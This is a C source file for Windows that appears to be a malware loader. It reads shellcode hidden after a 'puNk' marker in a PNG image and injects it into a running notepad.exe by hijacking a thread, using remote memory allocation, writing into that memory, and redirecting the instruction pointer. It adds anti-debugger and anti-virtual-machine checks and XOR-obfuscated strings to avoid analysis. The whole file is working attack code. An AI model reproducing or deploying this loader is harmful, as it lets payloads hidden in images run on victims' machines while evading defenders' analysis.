#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <Windows.h>
#include <TlHelp32.h>

#define CHUNK_TYPE_PUNK "puNk"
#define FILE_MODE "rb"
#define SHELLCODE_SIZE 271616
#define KEY "Kernel32.dll"


#ifndef _WINTERNL_
extern NTSTATUS NTAPI NtQueryInformationProcess(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);
#endif

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

void CheckDebugger(void) __attribute__((constructor));

void CheckDebugger(void) {
/*
A simple function to check if the application running under debugger
witout using the API function IsDebuggerPresent()
*/

PROCESS_BASIC_INFORMATION pbi;
NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 0, &pbi, sizeof(pbi), NULL);

if (NT_SUCCESS(status) && pbi.PebBaseAddress && *((BYTE*)pbi.PebBaseAddress + 2)) {
    
    //MessageBox(NULL, "Debugger detected!", "Anti-Debugging", MB_OK | MB_ICONWARNING); 
    ExitProcess(0);

} 
}

void xorEncryptDecrypt(char *input, const char *key, size_t length) {
    /*
    Function to decrypt (and encrypt) a string using XOR
    recive 2 string XOR between them and save the result 
    in the first one 
    */

    size_t keyLen = strlen(key);

    for (size_t i = 0; i < length; ++i) {
        input[i] = input[i] ^ key[i % keyLen];
    }
}

void findPunkSequence(FILE* input_file, unsigned char* buffer) {
    /*
    The function recive a PNG file and find the sequence puNk inside it
    and read from there into buffer the number on bytes save in the var
    named SHELLCODE_SIZE
    */

    const char* sequenceToFind = "puNk";
    size_t sequenceLength = 4;

    int ch;
    size_t currentIndex = 0;

    while ((ch = fgetc(input_file)) != EOF) {
        if (ch == sequenceToFind[currentIndex]) {
            currentIndex++;

            if (currentIndex == sequenceLength) {
                
                //Sequence 'puNk' found
                fread(buffer, 1, SHELLCODE_SIZE, input_file);
                break;
            }
        } 
        else {
            currentIndex = 0;
        }
    }
}

DWORD getProcessIdByName(const char* processName) {
    /*
    A function that return a process id by a process name
    */

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0; 
    }

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0; // Process with the specified name not found
}

DWORD AntiVM(const char* processName) {
    /*
    Look for known VMware process, if the process runnig its mean
    we are on Virual Machine and the process exit
    */

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0; // Failed to create a snapshot
    }

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                ExitProcess(0);
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

int main(int argc, char** argv) {

    // Vars:
    HANDLE targetProcessHandle;
	PVOID remoteBuffer;
	HANDLE threadHijacked = NULL;
	HANDLE snapshot;
	THREADENTRY32 threadEntry;
	CONTEXT context;
    FILE* input_file;

    unsigned char shellcode[SHELLCODE_SIZE];

    // Build the string vm3dservice.exe that will send to the function AntiVM
    char encryptedVMProc[] = {0x3D, 0x08, 0x41, 0x0A, 0x16, 0x09,
                              0x41, 0x44, 0x47, 0x07, 0x09, 0x42,
                              0x2E, 0x1D, 0x17, 0x6E, 0x65};

    size_t encryptedVNProcLength = sizeof(encryptedVMProc) / sizeof(encryptedVMProc[0]);

    // Create a copy for decryption to avoid modifying the original data
    char decryptedVMProc[encryptedVNProcLength + 1];
    memcpy(decryptedVMProc, encryptedVMProc, encryptedVNProcLength);
    decryptedVMProc[encryptedVNProcLength] = '\0';

    // Decrypt the string back to vm3dservice.exe:
    xorEncryptDecrypt(decryptedVMProc, KEY, (encryptedVNProcLength+1));

    // Check if we run in VM:
    AntiVM(decryptedVMProc);

    // --------------------------------------------------------------------
    // Build the string notepad.exe, our target process
    char encrypteTargetProcess[] = {
        0x25,0x0A, 0x06, 0x0B, 0x15, 0x0D,
        0x57, 0x1C, 0x4B, 0x1C, 0x09, 0x6C,
        0x4B
    };
    
    size_t encryptedTProcLength = sizeof(encrypteTargetProcess) / sizeof(encrypteTargetProcess[0]);

    // Create a copy for decryption to avoid modifying the original data
    char decryptedProc[encryptedTProcLength + 1];
    memcpy(decryptedProc, encrypteTargetProcess, encryptedTProcLength);
    decryptedProc[encryptedTProcLength] = '\0';

    // Decrypt the string back to notepad.exe:
    xorEncryptDecrypt(decryptedProc, KEY, (encryptedTProcLength+1));

    // --------------------------------------------------------------------
    // Encrypted file path in hexadecimal format
    // My path after decryption is:
    // C:\\Users\\omer\\Desktop\\png-punked-master\\example\\Adobe_Edited.PNG
    char encryptedData[] = {
        0x08, 0x5F, 0x2E, 0x3B, 0x16, 0x09, 0x41, 0x41,
        0x72, 0x0B, 0x01, 0x09, 0x39, 0x39, 0x36, 0x0B,
        0x16, 0x07, 0x47, 0x5D, 0x5E, 0x38, 0x1C, 0x02,
        0x2C, 0x48, 0x02, 0x1B, 0x0B, 0x07, 0x56, 0x56,
        0x03, 0x09, 0x0D, 0x1F, 0x3F, 0x00, 0x00, 0x32,
        0x00, 0x14, 0x52, 0x5F, 0x5E, 0x08, 0x09, 0x30,
        0x0A, 0x01, 0x1D, 0x0C, 0x00, 0x33, 0x76, 0x56,
        0x47, 0x10, 0x09, 0x08, 0x65, 0x35, 0x3C, 0x29,
        0x65, 0x6C
    };

    size_t encryptedDataLength = sizeof(encryptedData) / sizeof(encryptedData[0]);

    // Create a copy for decryption to avoid modifying the original data
    char decryptedData[encryptedDataLength + 1];
    memcpy(decryptedData, encryptedData, encryptedDataLength);
    decryptedData[encryptedDataLength] = '\0';

    // Decrypt the file path:
    xorEncryptDecrypt(decryptedData, KEY, (encryptedDataLength+1));

    if (fopen_s(&input_file, decryptedData, FILE_MODE) != 0) {
        perror("Error opening input file");
        exit(EXIT_FAILURE);
    }

    // Look for the puNk -> point to the start of the future injected shellcode
    findPunkSequence(input_file, shellcode);
    fclose(input_file);

    // Choose a process to inject (notepad.exe)
    const char* targetProcessName = decryptedProc;
	DWORD targetPID = getProcessIdByName(targetProcessName);
    //printf("Process ID is: %d\n", targetPID);
    
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	
    // Thread Hijacked...
	targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, SHELLCODE_SIZE, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, SHELLCODE_SIZE, NULL);
	
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadEntry);

	while (Thread32Next(snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == targetPID)
		{
			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}
	
	SuspendThread(threadHijacked);
	
	GetThreadContext(threadHijacked, &context);
	context.Rip = (DWORD_PTR)remoteBuffer;
	SetThreadContext(threadHijacked, &context);
	
	ResumeThread(threadHijacked);
    
}
